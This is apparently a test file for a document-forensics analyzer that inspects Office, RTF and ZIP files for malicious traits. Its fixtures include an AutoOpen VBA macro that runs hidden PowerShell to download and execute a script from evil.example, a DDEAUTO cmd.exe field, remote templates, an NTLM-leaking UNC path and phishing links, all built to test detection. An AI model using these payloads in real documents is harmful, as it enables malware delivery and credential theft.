import { analyzeFile } from '../src/forensics';
import { analyzeOle, decompressVba, parseCfb } from '../src/forensics/ole';
import { analyzeOoxml } from '../src/forensics/ooxml';
import { analyzeRtf } from '../src/forensics/rtf';
import { entropy, md5, sniff } from '../src/forensics/util';
import { makeCfb, makeVbaProject } from './forensicsHelpers';
import { makeZip } from './helpers';

const enc = (s: string) => new TextEncoder().encode(s);
const ids = (r: { anomalies: { id: string }[] }) => r.anomalies.map((a) => a.id);

const MACRO = `Attribute VB_Name = "ThisDocument"
Sub AutoOpen()
  Dim s As String
  s = "powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')"""
  CreateObject("WScript.Shell").Run s, 0
End Sub
`;

describe('OLE / VBA (oledump-style)', () => {
  it('decompresses the MS-OVBA container, including copy tokens', () => {
    // 'a' then a copy token repeating it 9 more times.
    expect(new TextDecoder().decode(decompressVba(Uint8Array.from([0x01, 0x03, 0xb0, 0x02, 0x61, 0x06, 0x00])) ?? new Uint8Array())).toBe('aaaaaaaaaa');
  });

  it('lists streams and reads a VBA project built from scratch', async () => {
    const cfb = parseCfb(makeVbaProject([{ name: 'ThisDocument', code: MACRO }]))!;
    expect(cfb.entries.map((e) => e.path)).toEqual(expect.arrayContaining(['VBA', 'VBA/dir', 'VBA/ThisDocument']));
  });

  it('finds the auto-run macro and what it does', async () => {
    const doc = makeCfb([{ name: 'Macros', children: [{ name: 'VBA', children: [] }] }]);
    void doc;
    const wrapper = makeCfb([{ name: 'Macros', children: [{ name: 'PROJECT', data: enc('ID="{X}"') }, ...vbaChildren()] }]);
    const r = await analyzeOle(wrapper);
    expect(r.report.macros.present).toBe(true);
    expect(r.report.macros.autoExec).toContain('AutoOpen');
    expect(r.report.macros.suspicious.join(' ')).toMatch(/PowerShell/);
    expect(ids(r)).toContain('office-macros');
    expect(r.anomalies.find((a) => a.id === 'office-macros')!.severity).toBe('critical');
    expect(r.links.map((l) => l.url)).toContain('http://evil.example/p.ps1');
  });

  it('survives a damaged container', async () => {
    const bad = new Uint8Array(2048);
    bad.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
    const r = await analyzeOle(bad);
    expect(ids(r)).toContain('ole-unreadable');
  });
});

function vbaChildren() {
  const cfb = parseCfb(makeVbaProject([{ name: 'ThisDocument', code: MACRO }]))!;
  return [{ name: 'VBA', children: cfb.entries.filter((e) => e.path.startsWith('VBA/')).map((e) => ({ name: e.name, data: cfb.read(e) })) }];
}

const CT = '<Types/>';
const REL = (target: string, type: string, id = 'rId1') => `<Relationships><Relationship Id="${id}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}" TargetMode="External"/></Relationships>`;

describe('Office Open XML (docx, xlsx, pptx)', () => {
  it('reads hyperlinks with their visible text, and flags a remote template', async () => {
    const zip = await makeZip([
      { name: '[Content_Types].xml', data: enc(CT) },
      { name: 'word/document.xml', deflate: true, data: enc('<w:document><w:body><w:p><w:hyperlink r:id="rId5"><w:r><w:t>Review invoice</w:t></w:r></w:hyperlink><w:r><w:t>Enable editing to view this document</w:t></w:r></w:p></w:body></w:document>') },
      { name: 'word/_rels/document.xml.rels', data: enc(REL('https://paypa1-secure.top/invoice', 'hyperlink', 'rId5')) },
      { name: 'word/_rels/settings.xml.rels', data: enc(REL('https://cdn.bad.example/t.dotm', 'attachedTemplate')) },
      { name: 'docProps/core.xml', data: enc('<cp:coreProperties><dc:creator>Mallory</dc:creator><cp:lastModifiedBy>Eve</cp:lastModifiedBy></cp:coreProperties>') },
    ]);
    const r = await analyzeOoxml(zip);
    expect(r.report.app).toBe('word');
    expect(r.links.find((l) => l.url === 'https://paypa1-secure.top/invoice')?.label).toBe('Review invoice');
    expect(ids(r)).toEqual(expect.arrayContaining(['office-remote-template', 'office-lure']));
    expect(r.report.metadata).toMatchObject({ Creator: 'Mallory', LastModifiedBy: 'Eve' });
    expect(r.report.lurePhrases).toContain('enable editing');
  });

  it('flags UNC paths that leak the Windows sign-in hash', async () => {
    const zip = await makeZip([
      { name: '[Content_Types].xml', data: enc(CT) },
      { name: 'word/document.xml', data: enc('<w:document/>') },
      { name: 'word/_rels/document.xml.rels', data: enc(REL('file:////evil.example/share/logo.png', 'image')) },
    ]);
    expect(ids(await analyzeOoxml(zip))).toContain('office-unc-leak');
  });

  it('finds field codes: DDE and remote pictures', async () => {
    const zip = await makeZip([
      { name: '[Content_Types].xml', data: enc(CT) },
      { name: 'word/document.xml', deflate: true, data: enc('<w:document><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText><w:instrText> INCLUDEPICTURE "http://tracker.example/p.gif" </w:instrText></w:document>') },
    ]);
    const r = await analyzeOoxml(zip);
    expect(ids(r)).toContain('office-dde');
    expect(r.links.map((l) => l.url)).toContain('http://tracker.example/p.gif');
  });

  it('reads the VBA project inside a docm', async () => {
    const zip = await makeZip([
      { name: '[Content_Types].xml', data: enc(CT) },
      { name: 'word/document.xml', data: enc('<w:document/>') },
      { name: 'word/vbaProject.bin', data: makeVbaProject([{ name: 'ThisDocument', code: MACRO }]) },
    ]);
    const r = await analyzeOoxml(zip);
    expect(r.report.macros.autoExec).toContain('AutoOpen');
    expect(r.anomalies.find((a) => a.id === 'office-macros')!.severity).toBe('critical');
  });

  it('reports hidden sheets, Auto_Open and formulas in a workbook', async () => {
    const zip = await makeZip([
      { name: '[Content_Types].xml', data: enc(CT) },
      { name: 'xl/workbook.xml', data: enc('<workbook><sheets><sheet name="Data" sheetId="1"/><sheet name="Payload" sheetId="2" state="veryHidden"/></sheets><definedNames><definedName name="_xlnm.Auto_Open">Payload!$A$1</definedName></definedNames></workbook>') },
      { name: 'xl/worksheets/sheet1.xml', deflate: true, data: enc('<worksheet><sheetData><row><c><f>HYPERLINK("https://login.bad.example/x","Open file")</f></c></row></sheetData></worksheet>') },
    ]);
    const r = await analyzeOoxml(zip);
    expect(ids(r)).toEqual(expect.arrayContaining(['office-hidden-sheet', 'office-auto-open-name']));
    expect(r.links.find((l) => l.url === 'https://login.bad.example/x')?.label).toBe('Open file');
  });

  it('finds links and program actions in a presentation', async () => {
    const zip = await makeZip([
      { name: '[Content_Types].xml', data: enc(CT) },
      { name: 'ppt/slides/slide1.xml', deflate: true, data: enc('<p:sld><a:t>Click</a:t><a:hlinkClick r:id="rId2"/><a:hlinkClick r:id="rId3" action="ppaction://program"/></p:sld>') },
      { name: 'ppt/slides/_rels/slide1.xml.rels', data: enc('<Relationships><Relationship Id="rId2" Type="http://x/hyperlink" Target="https://p.example/a" TargetMode="External"/><Relationship Id="rId3" Type="http://x/hyperlink" Target="file:///C:/x.exe" TargetMode="External"/></Relationships>') },
    ]);
    const r = await analyzeOoxml(zip);
    expect(r.report.app).toBe('powerpoint');
    expect(ids(r)).toContain('office-ppt-action');
    expect(r.links.map((l) => l.url)).toEqual(expect.arrayContaining(['https://p.example/a', 'file:///C:/x.exe']));
  });
});

describe('RTF (rtfdump-style)', () => {
  it('finds an Equation Editor object and a remote template', () => {
    const cfb = makeCfb([{ name: 'Equation Native', data: enc('x'.repeat(40)) }]);
    const hex = [...cfb].map((b) => b.toString(16).padStart(2, '0')).join('');
    const rtf = `{\\rtf1{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata ${hex}}}{\\*\\template http://evil.example/t.dot}}`;
    const r = analyzeRtf(enc(rtf));
    expect(ids(r)).toEqual(expect.arrayContaining(['rtf-object', 'rtf-template']));
    expect(r.anomalies.find((a) => a.id === 'rtf-object')!.severity).toBe('critical');
    expect(r.links.map((l) => l.url)).toContain('http://evil.example/t.dot');
  });
});

describe('the orchestrator', () => {
  it('knows a program by its bytes, whatever the name says', async () => {
    const exe = new Uint8Array(512);
    exe.set([0x4d, 0x5a]);
    new DataView(exe.buffer).setUint32(0x3c, 0x80, true);
    exe.set([0x50, 0x45, 0, 0], 0x80);
    const r = await analyzeFile(exe, 'invoice.pdf');
    expect(r.kind).toBe('executable');
    expect(ids(r)).toEqual(expect.arrayContaining(['program-content', 'type-mismatch']));
  });

  it('opens a ZIP and analyses the documents inside, bubbling findings up', async () => {
    const inner = await makeZip([
      { name: '[Content_Types].xml', data: enc(CT) },
      { name: 'word/document.xml', data: enc('<w:document/>') },
      { name: 'word/_rels/settings.xml.rels', data: enc(REL('https://cdn.bad.example/t.dotm', 'attachedTemplate')) },
    ]);
    const zip = await makeZip([{ name: 'invoice.docx', data: inner }, { name: 'readme.txt', data: enc('hi') }]);
    const r = await analyzeFile(zip, 'package.zip');
    expect(r.children.map((c) => c.path)).toEqual(['invoice.docx']);
    expect(r.anomalies.some((a) => a.id.startsWith('in:invoice.docx:office-remote-template'))).toBe(true);
    expect(r.links.some((l) => l.url === 'https://cdn.bad.example/t.dotm')).toBe(true);
  });

  it('computes hashes locally', async () => {
    const r = await analyzeFile(enc('abc'), 'x.txt');
    expect(r.hashes.sha256).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
    expect(r.hashes.sha1).toBe('a9993e364706816aba3e25717850c26c9cd0d89d');
    expect(r.hashes.md5).toBe('900150983cd24fb0d6963f7d28e17f72');
  });

  it('has working file-type and entropy helpers', () => {
    expect(md5(enc(''))).toBe('d41d8cd98f00b204e9800998ecf8427e');
    expect(sniff(enc('%PDF-1.7\n')).kind).toBe('pdf');
    expect(sniff(enc('<html><body>')).kind).toBe('html');
    expect(entropy(new Uint8Array(1000))).toBe(0);
    expect(entropy(Uint8Array.from({ length: 256 }, (_, i) => i))).toBe(8);
  });
});
